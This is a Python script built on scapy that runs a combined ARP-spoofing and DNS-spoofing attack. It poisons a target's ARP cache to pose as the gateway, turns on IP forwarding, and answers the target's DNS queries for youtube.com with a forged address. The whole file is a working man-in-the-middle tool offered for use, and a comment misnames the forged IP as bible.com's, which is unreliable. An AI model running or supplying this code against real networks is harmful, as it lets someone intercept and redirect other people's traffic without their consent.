from scapy.all import *
import os
import threading

# Function to enable IP forwarding
def enable_ip_forwarding():
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

# Function to disable IP forwarding
def disable_ip_forwarding():
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")

# Function to spoof DNS response
def dns_response(packet):
    if packet.haslayer(DNSQR) and b"youtube.com" in packet[DNSQR].qname:
        spoofed_pkt = IP(dst=packet[IP].src, src=packet[IP].dst) / \
                      UDP(dport=packet[UDP].sport, sport=packet[UDP].dport) / \
                      DNS(id=packet[DNS].id, qr=1, aa=1, qd=packet[DNS].qd,
                          an=DNSRR(rrname=packet[DNS].qd.qname, ttl=10, rdata="93.184.216.34"))  # IP for bible.com
        send(spoofed_pkt, verbose=0)
        print(f"Spoofed DNS response sent to {packet[IP].src} for {packet[DNS].qd.qname.decode('utf-8')}")

# Function to perform ARP spoofing
def arp_spoof(target_ip, spoof_ip):
    target_mac = getmacbyip(target_ip)
    while True:
        send(ARP(op=2, pdst=target_ip, psrc=spoof_ip, hwdst=target_mac), verbose=0)
        time.sleep(2)

# Main function to start DNS spoofing and ARP spoofing
def start_spoofing(gateway_ip, target_ip):
    enable_ip_forwarding()
    print("Starting DNS and ARP spoofing... Press Ctrl+C to stop.")
    try:
        # Start ARP spoofing in a separate thread
        arp_thread = threading.Thread(target=arp_spoof, args=(target_ip, gateway_ip))
        arp_thread.start()
        
        # Start DNS spoofing
        sniff(filter="udp port 53", prn=dns_response, store=0)
    except KeyboardInterrupt:
        print("Spoofing stopped.")
    finally:
        disable_ip_forwarding()

if __name__ == "__main__":
    gateway_ip = input("Enter the gateway IP: ")
    target_ip = input("Enter the target IP (or range): ")
    start_spoofing(gateway_ip, target_ip)
